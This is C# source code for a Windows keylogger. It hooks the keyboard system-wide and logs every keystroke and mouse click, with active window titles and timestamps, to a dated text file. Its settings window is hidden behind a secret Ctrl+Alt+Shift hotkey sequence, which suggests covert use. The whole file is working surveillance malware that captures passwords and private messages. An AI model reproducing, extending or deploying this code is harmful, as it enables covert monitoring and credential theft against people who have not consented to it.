using Keystroke.API;
using Keystroke.API.CallbackObjects;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace keylogger
{
    class Keylogger
    {

        #region variable
        public static DateTime datum = DateTime.Now;
        public static string pathString = Properties.Settings.Default.keyloggerlocatie + "keylogger\\screenshot\\";
        public static string path = (pathString + "/" + datum.ToShortDateString() + ".text");
        public static String hWndTitle;
        public static String hWndTitlePast;
        public static KeystrokeAPI keystrokeApi = new KeystrokeAPI();
        public static KeystrokeAPI hotkey = new KeystrokeAPI();
        public static bool Key1 = false, Key2 = false, Key3 = false, Key4 = false, Home = false;
        #endregion

        #region keylogger
        public static void Logger()
        {
            hWndTitle = window.GetActiveWindowTitle();
            hWndTitlePast = hWndTitle;

                Settings.hotkey = true;
            keystrokeApi.CreateKeyboardHook(Save);
            Application.Run();
        }

        #endregion

        #region save keylog
        private static void Save(KeyPressed key)
        {
            bool keyloggerbool = Properties.Settings.Default.activeerkeyloger;
            
            System.IO.Directory.CreateDirectory(pathString);
            Settings form1 = new Settings();

            if (Properties.Settings.Default.Settingmenu == 1)
            {
                Properties.Settings.Default.sneltoets = "Home";
                Properties.Settings.Default.Save();
            }
            if (Settings.hotkey)
            {
                if (Properties.Settings.Default.sneltoets == "Home")
                {
                    check(key);
                    if (Key3 == true && key.KeyCode.ToString() == "Home")
                    {
                        form1.Show();
                        Key1 = false;
                        Key2 = false;
                        Key3 = false;
                        Settings.hotkey = false;
                    }
                }
                if (Properties.Settings.Default.sneltoets == "None")
                {
                    check(key);
                    if (Key3 == true)
                    {
                        form1.Show();
                        Key1 = false;
                        Key2 = false;
                        Key3 = false;
                        Settings.hotkey = false;
                    }
                }

            }
            if (keyloggerbool)
            {
                using (StreamWriter sw = File.AppendText(path))
                {
                    hWndTitle = window.GetActiveWindowTitle();


                    if (hWndTitle != hWndTitlePast)
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine(datum);
                        sw.WriteLine(hWndTitle);
                        hWndTitlePast = hWndTitle;
                    }
                    if (hWndTitle == hWndTitlePast)
                    {

                        // dit moet nog verbeterd worden
                        if (key.KeyCode.ToString() == "LButton")
                        { sw.WriteLine("<LMouse>"); }
                        else if (key.KeyCode.ToString() == "RButton")
                        { sw.WriteLine("<RMouse>"); }
                        else if (key.KeyCode.ToString() == "Back")
                        { sw.WriteLine("<BackSpace>");

                        }
                        else if (key.KeyCode.ToString() == "Space")
                        { sw.Write(" "); }
                        else if (key.KeyCode.ToString() == "Return")
                        {
                            sw.WriteLine(Environment.NewLine);
                            sw.WriteLine(datum);
                            sw.WriteLine("<Enter>");
                        }
                        else if (key.KeyCode.ToString() == "Delete")
                        { sw.WriteLine("<Del>"); }
                        else if (key.KeyCode.ToString() == "Insert")
                        { sw.WriteLine("<Ins>"); }
                        else if (key.KeyCode.ToString() == "Home")
                        { sw.WriteLine("<Home>"); }
                        else if (key.KeyCode.ToString() == "End")
                        { sw.WriteLine("<End>"); }
                        else if (key.KeyCode.ToString() == "Tab")
                        { sw.WriteLine("<Tab>"); }
                        else if (key.KeyCode.ToString() == "Prior")
                        { sw.WriteLine("<Page Up>"); }
                        else if (key.KeyCode.ToString() == "PageDown")
                        { sw.WriteLine("<Page Down>"); }
                        else if (key.KeyCode.ToString() == "LWin" || key.KeyCode.ToString() == "RWin")
                        { sw.Write("<Win>"); }
                        else { sw.Write(key); }
                    }
                }
            }

        }

        private static void check(KeyPressed key)
        {
            if (key.KeyCode.ToString() == "LControlKey" || key.KeyCode.ToString() == "RControlKey")
            {
                Key1 = true;
            }
            if (Key1 == true && key.KeyCode.ToString() == "LMenu")
            {
                Key2 = true;
            }
            if (Key2 == true && key.KeyCode.ToString() == "LShiftKey" || key.KeyCode.ToString() == "RShiftKey")
            {
                Key3 = true;
            }
        }
        #endregion

    }
}
    

